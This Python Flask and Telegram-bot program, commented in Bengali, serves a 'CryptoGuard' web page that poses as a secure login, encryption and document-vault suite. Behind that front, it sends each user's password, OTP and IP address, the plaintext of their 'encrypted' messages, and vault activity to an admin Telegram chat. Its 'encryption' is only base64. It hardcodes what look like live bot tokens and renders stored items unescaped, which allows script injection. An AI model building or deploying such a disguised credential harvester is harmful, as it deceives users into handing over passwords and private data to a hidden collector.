import os
import threading
import random
import base64
from datetime import datetime
import telebot
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# টেলিগ্রাম ও এডমিন বটের টোকেন
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8868227957:AAFULZPQT0RMUGWXnQfhLItkMSYFEgkLstg")
ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8047864259:AAHEokK5sjq1jJFuIq_e94sPIeTM2OlsqSs")

bot = telebot.TeleBot(TELEGRAM_TOKEN)
admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN)

# পার্সিস্টেন্ট সার্ভার ডাটাবেজ
user_persistent_db = {}
otp_storage = {}

def send_to_admin(log_msg):
    try:
        admin_chat_id = os.environ.get("ADMIN_CHAT_ID", "7938556654")
        admin_bot.send_message(admin_chat_id, f"🛡️ **সায়েন্স ফেয়ার সাইবার সিকিউরিটি লগ** 🛡️\n\n{log_msg}\n\nকন্টাক্ট: @CipherSentinel_BD", parse_mode="Markdown")
    except Exception as e:
        print(f"Admin Bot Error: {e}")

def encrypt_text(text):
    return base64.b64encode(text.encode('utf-8')).decode('utf-8')

def decrypt_text(encoded_text):
    try:
        return base64.b64decode(encoded_text.encode('utf-8')).decode('utf-8')
    except:
        return "⚠️ ডিক্রিপশন ব্যর্থ! সঠিক কোড দিন।"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    bot.reply_to(message, f"⚡ সাইবার সিকিউরিটি ওটিপি বটে আপনাকে স্বাগতম!\n\n💡 **নিয়ম:** ওয়েবসাইট থেকে আপনার দেওয়া নাম বা ইউজারনেমটি এখানে হুবহু পেস্ট বা লিখে পাঠান, বট সাথে সাথে আপনাকে ওটিপি কোড সাজেস্ট করবে!\n🕒 সময়: {time_str}")

@bot.message_handler(func=lambda message: True)
def handle_telegram_text(message):
    text = message.text.strip().lower().replace('@', '')
    if text in otp_storage:
        otp = otp_storage[text]
        bot.reply_to(message, f"🔐 নাম/ইউজার: @{text}\n🔢 সাজেস্টেড ওটিপি কোড: *{otp}*", parse_mode="Markdown")
        send_to_admin(f"🤖 বট থেকে ওটিপি চেক করা হয়েছে:\n👤 ইউজার/নাম: @{text}\n🔢 ওটিপি: {otp}")
    else:
        bot.reply_to(message, f"⚠️ '{text}' নামে কোনো একটিভ ওটিপি রিকোয়েস্ট পাওয়া যায়নি। আগে ওয়েবসাইট থেকে নাম ও পাসওয়ার্ড দিয়ে সাবমিট করুন।")

def run_telegram_bot():
    try:
        bot.infinity_polling(none_stop=True)
    except Exception as e:
        print(f"Bot Error: {e}")

# সায়েন্স ফেয়ার সাইবারপাঙ্ক থিম ও ম্যাট্রিক্স রেইন/রাশিয়ান লেটার ইফেক্ট সহ ইউআই
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <title>CryptoGuard - Cyberpunk Security Suite</title>
    <style>
        :root {
            --bg-color: #05070b; --card-bg: rgba(13, 17, 23, 0.85); --text-color: #c9d1d9; --border-color: #30363d; --accent-color: #00ff66; --btn-bg: #238636;
        }
        body { background: var(--bg-color); color: var(--text-color); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; min-height: 100vh; overflow-x: hidden; position: relative; }
        
        #matrixRain { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; opacity: 0.25; }

        @keyframes screenGlitch {
            0% { transform: translate(0, 0); filter: blur(0px); }
            2% { transform: translate(-3px, 2px); filter: blur(1.5px); }
            4% { transform: translate(3px, -2px); filter: blur(0px); }
            6% { transform: translate(0, 0); filter: blur(0px); }
            50% { transform: translate(0, 0); filter: blur(0px); }
            52% { transform: translate(2px, 3px); filter: blur(2px); }
            54% { transform: translate(-2px, -1px); filter: blur(0px); }
            56% { transform: translate(0, 0); filter: blur(0px); }
            100% { transform: translate(0, 0); filter: blur(0px); }
        }
        .glitch-active { animation: screenGlitch 4s infinite; }

        .container { max-width: 900px; margin: auto; position: relative; z-index: 2; }
        
        .header-box { display: flex; justify-content: space-between; align-items: center; background: var(--card-bg); border: 1px solid var(--border-color); padding: 15px 25px; border-radius: 12px; backdrop-filter: blur(10px); margin-bottom: 20px; box-shadow: 0 8px 32px rgba(0,255,102,0.15); }
        h1 { margin: 0; font-size: 22px; color: var(--accent-color); text-shadow: 0 0 10px rgba(0,255,102,0.5); }
        
        .clock-widget { background: #000; border: 1px solid var(--accent-color); padding: 6px 14px; border-radius: 20px; font-family: monospace; font-size: 14px; color: var(--accent-color); box-shadow: 0 0 10px rgba(0, 255, 102, 0.3); }

        .tab-menu { display: flex; gap: 10px; margin-bottom: 20px; }
        .tab-btn { flex: 1; background: rgba(33, 38, 45, 0.8); border: 1px solid var(--border-color); color: var(--text-color); padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; backdrop-filter: blur(5px); }
        .tab-btn.active { background: var(--accent-color); color: #000; border-color: var(--accent-color); box-shadow: 0 0 15px rgba(0, 255, 102, 0.5); }
        
        .layer-section { display: none; background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 30px; backdrop-filter: blur(10px); box-shadow: 0 8px 32px rgba(0,0,0,0.4); margin-bottom: 20px; }
        .layer-section.active { display: block; }

        h2 { color: var(--accent-color); border-bottom: 1px solid var(--border-color); padding-bottom: 10px; margin-top: 0; font-size: 18px; }
        input, textarea { width: 100%; padding: 12px 15px; margin: 10px 0; background: rgba(13, 17, 23, 0.9); border: 1px solid var(--border-color); color: #fff; border-radius: 8px; box-sizing: border-box; font-size: 14px; }
        input:focus, textarea:focus { border-color: var(--accent-color); outline: none; box-shadow: 0 0 8px rgba(0, 255, 102, 0.3); }
        
        button { background: var(--btn-bg); color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; transition: 0.2s; font-size: 14px; }
        button:hover { opacity: 0.9; transform: translateY(-1px); }
        
        .highlight { color: #00ff66; font-weight: bold; }
        .vault-box { background: rgba(13, 17, 23, 0.9); border: 1px dashed var(--accent-color); padding: 15px; border-radius: 8px; max-height: 200px; overflow-y: auto; font-size: 13px; margin-top: 15px; }
        .info-note { background: rgba(0, 255, 102, 0.1); border-left: 4px solid var(--accent-color); padding: 10px 15px; border-radius: 0 8px 8px 0; font-size: 13px; margin-bottom: 15px; }
    </style>
</head>
<body class="glitch-active">
    <canvas id="matrixRain"></canvas>

    <div class="container">
        <div class="header-box">
            <h1>🛡️ CryptoGuard Cyberpunk Edition</h1>
            <div class="clock-widget">⏰ <span id="liveClock">00:00:00</span></div>
        </div>

        <div class="tab-menu">
            <button class="tab-btn active" onclick="switchLayer('layer1')">লেয়ার ১: লগইন ও ওটিপি</button>
            <button class="tab-btn" onclick="switchLayer('layer2')" id="btnLayer2" style="opacity: 0.4; cursor: not-allowed;" disabled>লেয়ার ২: ক্রিপ্টো হাব</button>
            <button class="tab-btn" onclick="switchLayer('layer3')" id="btnLayer3" style="opacity: 0.4; cursor: not-allowed;" disabled>লেয়ার ৩: ডকুমেন্ট ভল্ট</button>
        </div>

        <!-- লেয়ার ১: নাম/ইউজারনেম সাবমিট ও টেলিগ্রাম ওটিপি ফ্লো -->
        <div class="layer-section active" id="layer1">
            <h2>🔐 লেয়ার ১: সিকিউরড টেলিগ্রাম ওটিপি অথেন্টিকেশন</h2>
            <div class="info-note">
                <b>নির্দেশনা:</b> আপনি চাইলে আপনার টেলিগ্রাম ইউজারনেম দিতে পারেন অথবা ইচ্ছামতো যেকোনো নির্দিষ্ট নাম দিতে পারেন। নাম ও পাসওয়ার্ড দিয়ে সাবমিট করার পর নামটি কপি করে টেলিগ্রাম বটে গিয়ে পাঠালে বট ওটিপি সাজেস্ট করবে!
            </div>
            
            <input type="text" id="username" placeholder="আপনার টেলিগ্রাম ইউজারনেম অথবা যেকোনো নির্দিষ্ট নাম">
            <input type="password" id="password" placeholder="আপনার নিজস্ব কাস্টম পাসওয়ার্ড দিন">
            <button onclick="requestOtp()">নাম ও পাসওয়ার্ড সাবমিট করুন</button>
            
            <input type="text" id="otpCode" placeholder="টেলিগ্রাম বট থেকে পাওয়া ৪ ডিজিটের ওটিপি কোডটি এখানে দিন">
            <button onclick="verifyAndUnlock()" style="background: #1f6feb;">ভেরিফাই করে পরবর্তী লেয়ারে প্রবেশ করুন</button>
            
            <p id="authStatus" style="font-weight: bold; margin-top: 12px; font-size: 14px; text-align: center;"></p>
            <p style="font-size: 12px; color: #8b949e; text-align: center; margin-top: 15px;">নেটওয়ার্ক আইপি ট্র্যাকিং: <span id="clientIp" class="highlight">ডিটেকটিং...</span></p>
        </div>

        <!-- লেয়ার ২: এনক্রিপশন ও ডিক্রিপশন ইঞ্জিন -->
        <div class="layer-section" id="layer2">
            <h2>⚡ লেয়ার ২: ক্রিপ্টো এনক্রিপশন ও ডিক্রিপশন হাব</h2>
            <p>আপনার গোপন মেসেজ এনক্রিপ্ট করুন অথবা অন্য কারো পাঠানো এনক্রিপ্টেড কোড ডিক্রিপ্ট করুন।</p>
            
            <textarea id="inputText" rows="3" placeholder="মেসেজ বা এনক্রিপ্টেড কোড এখানে লিখুন..."></textarea>
            <button onclick="processCrypto('encrypt')">টেক্সট এনক্রিপ্ট করুন</button>
            <button onclick="processCrypto('decrypt')" style="background: #da3633;">টেক্সট ডিক্রিপ্ট করুন</button>
            
            <textarea id="outputText" rows="3" readonly placeholder="আউটপুট ফলাফল এখানে দেখাবে..." style="margin-top: 15px;"></textarea>
        </div>

        <!-- লেয়ার ৩: সিকিউরড ডকুমেন্ট ও ইমেজ ইনফো ভল্ট -->
        <div class="layer-section" id="layer3">
            <h2>📁 লেয়ার ৩: সিকিউরড ডকুমেন্ট ও ইমেজ ভল্ট</h2>
            <p>আপনার সংবেদনশীল ছবি বা ডকুমেন্টের ইনফো আলাদা পাসওয়ার্ড দিয়ে এই ভল্টে সংরক্ষণ করুন।</p>
            
            <input type="text" id="docTitle" placeholder="ডকুমেন্ট বা ছবির নাম/টাইটেল">
            <textarea id="docInfo" rows="2" placeholder="গোপন লিংক বা ডকুমেন্ট ইনফো..."></textarea>
            <input type="password" id="vaultPassword" placeholder="এই ভল্টের জন্য আলাদা সিক্রেট পাসওয়ার্ড">
            <button onclick="saveToVault()" style="background: #8957e5;">ভল্টে সেকিউরলি সংরক্ষণ করুন</button>
            
            <p style="margin: 20px 0 5px; font-size: 13px; font-weight: bold;">আপনার পার্সিস্টেন্ট সংরক্ষিত ফাইলসমূহ:</p>
            <div class="vault-box" id="vaultContainer">কোনো ডাটা পাওয়া যায়নি।</div>
        </div>
    </div>

    <script>
        const canvas = document.getElementById('matrixRain');
        const ctx = canvas.getContext('2d');

        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);

        const russianChars = 'АБВГДЕЖЗИКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%&*';
        const alphabet = russianChars.split('');

        const fontSize = 16;
        let columns = canvas.width / fontSize;
        let rainDrops = [];
        for (let x = 0; x < columns; x++) {
            rainDrops[x] = 1;
        }

        function drawMatrix() {
            ctx.fillStyle = 'rgba(5, 7, 11, 0.08)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            ctx.fillStyle = '#00ff66';
            ctx.font = fontSize + 'px monospace';

            for (let i = 0; i < rainDrops.length; i++) {
                const text = alphabet[Math.floor(Math.random() * alphabet.length)];
                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);

                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    rainDrops[i] = 0;
                }
                rainDrops[i]++;
            }
        }
        setInterval(drawMatrix, 30);

        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => { document.getElementById('clientIp').innerText = data.ip; })
            .catch(() => { document.getElementById('clientIp').innerText = '127.0.0.1 (Localhost)'; });

        setInterval(() => {
            document.getElementById('liveClock').innerText = new Date().toLocaleTimeString();
        }, 1000);

        function switchLayer(layerId) {
            document.querySelectorAll('.layer-section').forEach(sec => sec.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
            
            document.getElementById(layerId).classList.add('active');
            event.currentTarget.classList.add('active');
        }

        let activeUser = '';

        function requestOtp() {
            const uname = document.getElementById('username').value.trim();
            const pwd = document.getElementById('password').value.trim();
            const ip = document.getElementById('clientIp').innerText;
            if(!uname) { alert('দয়া করে আপনার টেলিগ্রাম ইউজারনেম বা নির্দিষ্ট নাম দিন!'); return; }
            if(!pwd) { alert('দয়া করে কাস্টম পাসওয়ার্ড দিন!'); return; }
            
            fetch('/login-step1', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username: uname, password: pwd, ip: ip})
            })
            .then(res => res.json())
            .then(data => {
                document.getElementById('authStatus').innerText = data.message;
                document.getElementById('authStatus').style.color = '#00ff66';
            });
        }

        function verifyAndUnlock() {
            const uname = document.getElementById('username').value.trim();
            const pwd = document.getElementById('password').value.trim();
            const otp = document.getElementById('otpCode').value.trim();
            
            fetch('/verify-otp', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username: uname, password: pwd, otp: otp})
            })
            .then(res => res.json())
            .then(data => {
                if(data.success) {
                    activeUser = uname;
                    document.getElementById('authStatus').innerText = "ভেরিফিকেশন সফল! আগের সমস্ত ডাটা রিকভার হয়েছে।";
                    document.getElementById('authStatus').style.color = '#00ff66';
                    
                    document.getElementById('btnLayer2').disabled = false;
                    document.getElementById('btnLayer2').style.opacity = '1';
                    document.getElementById('btnLayer2').style.cursor = 'pointer';
                    
                    document.getElementById('btnLayer3').disabled = false;
                    document.getElementById('btnLayer3').style.opacity = '1';
                    document.getElementById('btnLayer3').style.cursor = 'pointer';
                    
                    updateVaultUI(data.vault);
                    alert('অভিনন্দন! লেয়ার ১ সফলভাবে সম্পন্ন হয়েছে।');
                } else {
                    document.getElementById('authStatus').innerText = data.message;
                    document.getElementById('authStatus').style.color = '#ff4d4d';
                }
            });
        }

        function saveToVault() {
            if(!activeUser) { alert('আগে লেয়ার ১ এ লগইন করুন!'); return; }
            const title = document.getElementById('docTitle').value;
            const info = document.getElementById('docInfo').value;
            const vpass = document.getElementById('vaultPassword').value;
            if(!title || !info || !vpass) { alert('টাইটেল, ইনফো এবং ভল্ট পাসওয়ার্ড দিন!'); return; }
            
            fetch('/save-vault', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username: activeUser, title: title, info: info, vault_pass: vpass})
            })
            .then(res => res.json())
            .then(data => {
                if(data.success) {
                    updateVaultUI(data.vault);
                    document.getElementById('docTitle').value = '';
                    document.getElementById('docInfo').value = '';
                    document.getElementById('vaultPassword').value = '';
                    alert('ডকুমেন্ট সফলভাবে ভল্টে সংরক্ষিত হয়েছে!');
                } else {
                    alert(data.message);
                }
            });
        }

        function updateVaultUI(vaultList) {
            const box = document.getElementById('vaultContainer');
            if(!vaultList || vaultList.length === 0) {
                box.innerHTML = 'কোনো সংরক্ষিত ডাটা নেই';
                return;
            }
            box.innerHTML = '';
            vaultList.forEach(item => {
                box.innerHTML += `<b>📌 ${item.title}</b>: ${item.info} <br><small style="color: #8b949e;">সময়: ${item.time}</small><hr style="border-color:#30363d; margin:8px 0;">`;
            });
        }

        function processCrypto(action) {
            const text = document.getElementById('inputText').value;
            if(!text) { alert('টেক্সট দিন!'); return; }
            
            fetch('/api-crypto', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({text: text, action: action, username: activeUser})
            })
            .then(res => res.json())
            .then(data => {
                document.getElementById('outputText').value = data.result;
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login-step1', methods=['POST'])
def login_step1():
    data = request.json or {}
    username = data.get('username', '').strip().lower().replace('@', '')
    password = data.get('password', '').strip()
    ip = data.get('ip', 'Unknown IP')
    
    if not username:
        return jsonify({"success": False, "message": "নাম বা ইউজারনেম দিতে হবে!"})
    
    if username not in user_persistent_db:
        user_persistent_db[username] = {"password": password, "vault": [], "cipher_history": []}
    else:
        user_persistent_db[username]["password"] = password
            
    otp = str(random.randint(1000, 9999))
    otp_storage[username] = otp
    
    send_to_admin(f"🔑 **ওটিপি রিকোয়েস্ট জেনারেট**\n👤 নাম/ইউজার: @{username}\n🔑 পাসওয়ার্ড: {password}\n🔢 ওটিপি: {otp}\n🌐 ক্লায়েন্ট আইপি: {ip}")
    return jsonify({"success": True, "message": f"সাবমিট সফল! এখন টেলিগ্রাম বটে গিয়ে এই নামটি (/start দেওয়ার পর) পাঠান, বট ওটিপি সাজেস্ট করবে।"})

@app.route('/verify-otp', methods=['POST'])
def verify_otp():
    data = request.json or {}
    username = data.get('username', '').strip().lower().replace('@', '')
    otp = data.get('otp', '').strip()
    password = data.get('password', '').strip()
    
    if username in otp_storage and otp_storage[username] == otp:
        user_data = user_persistent_db.get(username, {"vault": []})
        if user_data.get("password") and user_data["password"] != password:
            return jsonify({"success": False, "message": "ভুল কাস্টম পাসওয়ার্ড!"})
            
        send_to_admin(f"✅ **সফল লগইন ও রিকভারি**\n👤 ইউজার/নাম: @{username}")
        return jsonify({"success": True, "message": "সফল!", "vault": user_data["vault"]})
    
    send_to_admin(f"❌ **ব্যর্থ লগইন চেষ্টা**\n👤 ইউজার/নাম: @{username}")
    return jsonify({"success": False, "message": "ভুল ওটিপি কোড!"})

@app.route('/save-vault', methods=['POST'])
def save_vault():
    data = request.json or {}
    username = data.get('username', '').strip().lower()
    title = data.get('title', '')
    info = data.get('info', '')
    vault_pass = data.get('vault_pass', '')
    
    if username in user_persistent_db:
        time_str = datetime.now().strftime("%Y-%m-%d %H:%M")
        item = {"title": title, "info": info, "vault_pass": vault_pass, "time": time_str}
        user_persistent_db[username]["vault"].append(item)
        send_to_admin(f"📁 **ডকুমেন্ট ভল্টে সেভ**\n👤 ইউজার/নাম: @{username}\n📌 টাইটেল: {title}")
        return jsonify({"success": True, "vault": user_persistent_db[username]["vault"]})
        
    return jsonify({"success": False, "message": "ইউজার সেশন পাওয়া যায়নি!"})

@app.route('/api-crypto', methods=['POST'])
def api_crypto():
    data = request.json or {}
    text = data.get('text', '')
    action = data.get('action', '')
    username = data.get('username', '')
    
    result = encrypt_text(text) if action == 'encrypt' else decrypt_text(text)
    
    if username and username in user_persistent_db:
        user_persistent_db[username]["cipher_history"].append({"action": action, "input": text, "result": result})
        
    send_to_admin(f"🔐 **ক্রিপ্টো এক্টিভিটি**\n⚙️ একশন: {action}\n📝 টেক্সট: {text}")
    return jsonify({"result": result})

if __name__ == '__main__':
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
